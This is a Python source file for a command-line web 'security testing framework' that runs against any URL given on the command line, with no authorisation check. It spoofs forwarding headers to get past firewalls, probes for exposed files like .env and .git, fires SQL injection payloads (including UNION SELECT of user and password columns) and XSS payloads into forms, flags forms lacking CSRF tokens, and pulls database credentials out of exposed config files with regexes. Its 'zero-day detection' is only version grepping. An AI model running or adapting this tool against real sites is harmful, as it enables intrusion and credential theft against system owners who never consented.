#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Zero Security Testing Framework
Advanced Web Security Testing Tool
Author: SayerLinux
Email: SayerLinux1@gmail.com
License: Educational Use Only
"""

import requests
import urllib3
import socket
import threading
import time
import random
import string
import re
import json
import sqlite3
import subprocess
import sys
import os
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import concurrent.futures
from datetime import datetime
import warnings

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class ZeroFramework:
    def __init__(self):
        self.target_url = ""
        self.results = {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []
        self.hidden_files = []
        self.db_credentials = []
        self.firewall_bypassed = False
        
    def banner(self):
        banner_text = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║                        Z E R O   F R A M E W O R K          ║
║                   Advanced Web Security Testing              ║
║                                                              ║
║  Author: SayerLinux                                          ║
║  Email: SayerLinux1@gmail.com                              ║
║  Version: 1.0.0                                            ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.RESET}
        """
        print(banner_text)
    
    def set_target(self, url):
        """Set the target URL for testing"""
        if not url.startswith('http'):
            url = 'http://' + url
        self.target_url = url.rstrip('/')
        print(f"{Colors.GREEN}[+] Target set to: {self.target_url}{Colors.RESET}")
    
    def firewall_bypass(self):
        """Attempt to bypass firewall protections"""
        print(f"{Colors.YELLOW}[*] Attempting firewall bypass...{Colors.RESET}")
        
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Host': '127.0.0.1'},
            {'X-Forwarded-Host': '127.0.0.1'}
        ]
        
        for header in bypass_headers:
            try:
                response = self.session.get(self.target_url, headers=header, timeout=10, verify=False)
                if response.status_code == 200:
                    self.firewall_bypassed = True
                    print(f"{Colors.GREEN}[+] Firewall bypass successful with header: {header}{Colors.RESET}")
                    return True
            except:
                continue
        
        print(f"{Colors.RED}[-] Firewall bypass failed{Colors.RESET}")
        return False
    
    def discover_hidden_files(self):
        """Discover hidden files and directories"""
        print(f"{Colors.YELLOW}[*] Discovering hidden files...{Colors.RESET}")
        
        common_files = [
            'admin.php', 'admin.html', 'admin/', 'administrator/', 'wp-admin/',
            'config.php', 'config.bak', 'config.txt', '.env', '.htaccess',
            'robots.txt', 'sitemap.xml', 'backup/', 'backups/', 'uploads/',
            'database/', 'db/', 'sql/', 'logs/', 'log/', 'temp/', 'tmp/',
            '.git/', '.svn/', '.DS_Store', 'phpinfo.php', 'test.php',
            'info.php', 'phpmyadmin/', 'pma/', 'mysql/', 'secret/',
            'private/', 'internal/', 'dev/', 'development/', 'staging/'
        ]
        
        found_files = []
        for file in common_files:
            url = urljoin(self.target_url, file)
            try:
                response = self.session.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    found_files.append(url)
                    print(f"{Colors.GREEN}[+] Found: {url}{Colors.RESET}")
            except:
                continue
        
        self.hidden_files = found_files
        return found_files
    
    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing for SQL injection...{Colors.RESET}")
        
        # Basic SQL injection payloads
        sql_payloads = [
            "'", "' OR '1'='1", "' OR 1=1--", "' UNION SELECT 1--",
            "' AND 1=0 UNION SELECT user,password FROM users--",
            "' AND 1=0 UNION SELECT database(),user()--",
            "' AND 1=0 UNION SELECT table_name FROM information_schema.tables--",
            "' AND 1=0 UNION SELECT column_name FROM information_schema.columns--"
        ]
        
        # Test forms and parameters
        try:
            response = self.session.get(self.target_url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                inputs = form.find_all('input')
                
                for payload in sql_payloads:
                    data = {}
                    for input_tag in inputs:
                        if input_tag.get('type') not in ['submit', 'button']:
                            name = input_tag.get('name')
                            if name:
                                data[name] = payload
                    
                    if data:
                        url = urljoin(self.target_url, action)
                        try:
                            if method == 'post':
                                res = self.session.post(url, data=data, timeout=5, verify=False)
                            else:
                                res = self.session.get(url, params=data, timeout=5, verify=False)
                            
                            if any(error in res.text.lower() for error in ['mysql', 'sql', 'syntax', 'error']):
                                vuln_info = {
                                    'type': 'SQL Injection',
                                    'url': url,
                                    'method': method,
                                    'payload': payload,
                                    'evidence': 'SQL error message detected'
                                }
                                self.vulnerabilities.append(vuln_info)
                                print(f"{Colors.RED}[!] SQL Injection found: {url}{Colors.RESET}")
                        except:
                            continue
        
        except Exception as e:
            print(f"{Colors.RED}[-] Error testing SQL injection: {e}{Colors.RESET}")
    
    def test_xss_vulnerabilities(self):
        """Test for XSS vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing for XSS vulnerabilities...{Colors.RESET}")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "'><script>alert('XSS')</script>",
            "\"<script>alert('XSS')</script>",
            "</script><script>alert('XSS')</script>"
        ]
        
        try:
            response = self.session.get(self.target_url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                inputs = form.find_all(['input', 'textarea'])
                
                for payload in xss_payloads:
                    data = {}
                    for input_tag in inputs:
                        if input_tag.get('type') not in ['submit', 'button']:
                            name = input_tag.get('name')
                            if name:
                                data[name] = payload
                    
                    if data:
                        url = urljoin(self.target_url, action)
                        try:
                            if method == 'post':
                                res = self.session.post(url, data=data, timeout=5, verify=False)
                            else:
                                res = self.session.get(url, params=data, timeout=5, verify=False)
                            
                            if payload in res.text:
                                vuln_info = {
                                    'type': 'XSS',
                                    'url': url,
                                    'method': method,
                                    'payload': payload,
                                    'evidence': 'Payload reflected in response'
                                }
                                self.vulnerabilities.append(vuln_info)
                                print(f"{Colors.RED}[!] XSS found: {url}{Colors.RESET}")
                        except:
                            continue
        
        except Exception as e:
            print(f"{Colors.RED}[-] Error testing XSS: {e}{Colors.RESET}")
    
    def test_csrf_vulnerabilities(self):
        """Test for CSRF vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing for CSRF vulnerabilities...{Colors.RESET}")
        
        try:
            response = self.session.get(self.target_url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                inputs = form.find_all('input')
                
                # Check for CSRF tokens
                csrf_found = False
                for input_tag in inputs:
                    name = input_tag.get('name', '').lower()
                    if any(token in name for token in ['csrf', 'token', '_token', 'nonce']):
                        csrf_found = True
                        break
                
                if not csrf_found:
                    vuln_info = {
                        'type': 'CSRF',
                        'url': urljoin(self.target_url, action),
                        'evidence': 'No CSRF token found in form'
                    }
                    self.vulnerabilities.append(vuln_info)
                    print(f"{Colors.RED}[!] CSRF vulnerability found: {urljoin(self.target_url, action)}{Colors.RESET}")
        
        except Exception as e:
            print(f"{Colors.RED}[-] Error testing CSRF: {e}{Colors.RESET}")
    
    def extract_database_info(self):
        """Attempt to extract database information"""
        print(f"{Colors.YELLOW}[*] Attempting database information extraction...{Colors.RESET}")
        
        # Common database paths
        db_paths = [
            'config.php', 'wp-config.php', 'database.php', 'db.php',
            'config/database.php', 'app/config/database.php',
            'application/config/database.php', 'sites/default/settings.php'
        ]
        
        for db_file in db_paths:
            url = urljoin(self.target_url, db_file)
            try:
                response = self.session.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    # Look for database credentials
                    patterns = [
                        r'database_host\s*=\s*["\']([^"\']+)["\']',
                        r'db_host\s*=\s*["\']([^"\']+)["\']',
                        r'mysql_host\s*=\s*["\']([^"\']+)["\']',
                        r'DB_HOST\s*=\s*["\']([^"\']+)["\']',
                        r'database_name\s*=\s*["\']([^"\']+)["\']',
                        r'db_name\s*=\s*["\']([^"\']+)["\']',
                        r'DB_NAME\s*=\s*["\']([^"\']+)["\']',
                        r'database_user\s*=\s*["\']([^"\']+)["\']',
                        r'db_user\s*=\s*["\']([^"\']+)["\']',
                        r'DB_USER\s*=\s*["\']([^"\']+)["\']',
                        r'database_password\s*=\s*["\']([^"\']+)["\']',
                        r'db_password\s*=\s*["\']([^"\']+)["\']',
                        r'DB_PASSWORD\s*=\s*["\']([^"\']+)["\']'
                    ]
                    
                    content = response.text
                    credentials = {}
                    for pattern in patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            credentials.update({pattern: matches})
                    
                    if credentials:
                        self.db_credentials.append({
                            'file': url,
                            'credentials': credentials
                        })
                        print(f"{Colors.GREEN}[+] Database credentials found in: {url}{Colors.RESET}")
            except:
                continue
    
    def zero_day_detection(self):
        """Basic framework for zero-day detection"""
        print(f"{Colors.YELLOW}[*] Running zero-day vulnerability detection...{Colors.RESET}")
        
        # Check for common vulnerable components
        components = [
            'wp-content/', 'wp-includes/', 'administrator/',
            'components/', 'modules/', 'plugins/', 'libraries/'
        ]
        
        for component in components:
            url = urljoin(self.target_url, component)
            try:
                response = self.session.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    # Basic version detection
                    version_patterns = [
                        r'version\s*["\']([\d.]+)["\']',
                        r'Version\s*["\']([\d.]+)["\']',
                        r'v([\d.]+)',
                        r'([\d.]+)\s*version'
                    ]
                    
                    content = response.text
                    for pattern in version_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            print(f"{Colors.YELLOW}[*] Found component: {component} (Version: {matches[0]}){Colors.RESET}")
            except:
                continue
    
    def generate_report(self):
        """Generate comprehensive security report"""
        report = {
            'target': self.target_url,
            'scan_date': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'hidden_files': self.hidden_files,
            'database_credentials': self.db_credentials,
            'firewall_bypassed': self.firewall_bypassed,
            'total_vulnerabilities': len(self.vulnerabilities)
        }
        
        # Save report to file
        filename = f"zero_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n{Colors.GREEN}[+] Report saved to: {filename}{Colors.RESET}")
        
        # Print summary
        print(f"\n{Colors.CYAN}{Colors.BOLD}=== SECURITY SCAN SUMMARY ==={Colors.RESET}")
        print(f"Target: {self.target_url}")
        print(f"Total Vulnerabilities Found: {len(self.vulnerabilities)}")
        print(f"Hidden Files Discovered: {len(self.hidden_files)}")
        print(f"Database Credentials Found: {len(self.db_credentials)}")
        print(f"Firewall Bypassed: {'Yes' if self.firewall_bypassed else 'No'}")
        
        if self.vulnerabilities:
            print(f"\n{Colors.RED}Vulnerabilities Found:{Colors.RESET}")
            for vuln in self.vulnerabilities:
                print(f"  - {vuln['type']} at {vuln['url']}")
        
        return report
    
    def run_full_scan(self, target_url):
        """Run complete security scan"""
        self.banner()
        self.set_target(target_url)
        
        # Run all tests
        self.firewall_bypass()
        self.discover_hidden_files()
        self.test_sql_injection()
        self.test_xss_vulnerabilities()
        self.test_csrf_vulnerabilities()
        self.extract_database_info()
        self.zero_day_detection()
        
        # Generate report
        return self.generate_report()

def main():
    if len(sys.argv) != 2:
        print(f"{Colors.RED}Usage: python Zero.py <target_url>{Colors.RESET}")
        sys.exit(1)
    
    target = sys.argv[1]
    zero = ZeroFramework()
    zero.run_full_scan(target)

if __name__ == "__main__":
    main()